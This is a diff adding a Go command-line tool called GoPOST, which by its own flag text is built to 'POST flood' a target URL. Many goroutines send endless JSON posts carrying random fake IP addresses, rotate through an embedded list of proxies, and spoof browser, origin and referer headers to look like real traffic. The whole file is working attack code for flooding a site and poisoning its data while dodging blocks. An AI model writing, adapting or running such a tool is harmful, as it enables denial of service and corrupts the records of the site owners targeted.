@@ -1,0 +1,129 @@
+package main
+
+import (
+	"bytes"
+	_ "embed"
+	"encoding/binary"
+	"flag"
+	"fmt"
+	"io"
+	"math/rand/v2"
+	"net"
+	"net/http"
+	url2 "net/url"
+	"os"
+	"strings"
+	"sync"
+)
+
+var stop bool = false
+var wg sync.WaitGroup
+
+//go:embed proxies-full.txt
+var proxies string
+var proxiesList []string
+
+func randRange(min, max int) int {
+	return rand.IntN(max-min) + min
+}
+
+func randomIpAddress() string {
+	buf := make([]byte, 4)
+
+	ip := rand.Uint32()
+
+	binary.LittleEndian.PutUint32(buf, ip)
+
+	return net.IP(buf).String()
+}
+
+func SendRandomData(url string, threadnum int, verbose bool, aggressive bool, origin string, referer string) {
+	defer wg.Done()
+	if verbose && !aggressive {
+		fmt.Printf("[THREAD #%d] Starting...\n", threadnum)
+	}
+
+	for stop == false {
+		if verbose && !aggressive {
+			fmt.Printf("[THREAD #%d] URL:>%s\n", threadnum, url)
+		}
+
+		var jsonStr = []byte(`{"ip":"` + randomIpAddress() + `","source":"prt.is-a.dev","path":"/"}`)
+
+		if verbose && !aggressive {
+			fmt.Printf("[THREAD #%d] JSON:>%s\n", threadnum, string(jsonStr))
+		}
+		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
+		req.Header.Set("Content-Type", "application/json")
+		if origin != "" {
+			req.Header.Set("origin", origin)
+		}
+		req.Header.Set("sec-ch-ua-platform", "\"Windows\"")
+		req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36")
+		req.Header.Set("sec-ch-ua", "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"")
+		req.Header.Set("sec-ch-ua-mobile", "?0")
+		req.Header.Set("accept", "*/*")
+		req.Header.Set("sec-fetch-site", "cross-site")
+		req.Header.Set("sec-fetch-mode", "cors")
+		req.Header.Set("sec-fetch-dest", "empty")
+		if referer != "" {
+			req.Header.Set("referer", referer)
+		}
+		req.Header.Set("accept-language", "en-US,en;q=0.9")
+		req.Header.Set("priority", "u=1, i")
+
+		var proxy = proxiesList[randRange(0, len(proxiesList)-1)]
+		if verbose && !aggressive {
+			fmt.Printf("[THREAD #%d] Proxy:>%s\n", threadnum, proxy)
+		}
+		proxyUrl, err := url2.Parse(proxy)
+
+		client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}}
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+
+		if !aggressive {
+			if verbose {
+				body, _ := io.ReadAll(resp.Body)
+				fmt.Printf("[THREAD #%d] Response Status: %s, Response Body: %s\n", threadnum, resp.Status, string(body))
+			} else {
+				fmt.Printf("[THREAD #%d] Response Status: %s\n", threadnum, resp.Status)
+			}
+		}
+
+		_ = resp.Body.Close()
+		client.CloseIdleConnections()
+	}
+
+}
+func main() {
+	urlPtr := flag.String("url", "", "URL to POST flood.")
+	originPtr := flag.String("origin", "", "(Optional) URL to value the origin header with.")
+	refererPtr := flag.String("referer", "", "(Optional) URL to value the referer header with.")
+	threadsPtr := flag.Int("threads", 16, "Number of goroutines to use.")
+	verbosePtr := flag.Bool("v", false, "Verbose output.")
+	speedModePtr := flag.Bool("a", false, "Do not log anything to console for max speed.")
+
+	flag.Parse()
+
+	if *urlPtr == "" {
+		fmt.Println("[ERROR] URL is required.")
+		os.Exit(1)
+	}
+
+	fmt.Println("GoPOST v1.0.0 starting...")
+	fmt.Printf("URL: %s\n", *urlPtr)
+	fmt.Printf("Threads: %d\n", *threadsPtr)
+	fmt.Printf("Verbose: %t\n", *verbosePtr)
+	fmt.Printf("Aggressive: %t\n", *speedModePtr)
+
+	proxiesList = strings.Split(proxies, "\n")
+
+	for i := 0; i < *threadsPtr; i++ {
+		wg.Add(1)
+		go SendRandomData(*urlPtr, i+1, *verbosePtr, *speedModePtr, *originPtr, *refererPtr)
+	}
+	wg.Wait()
+}
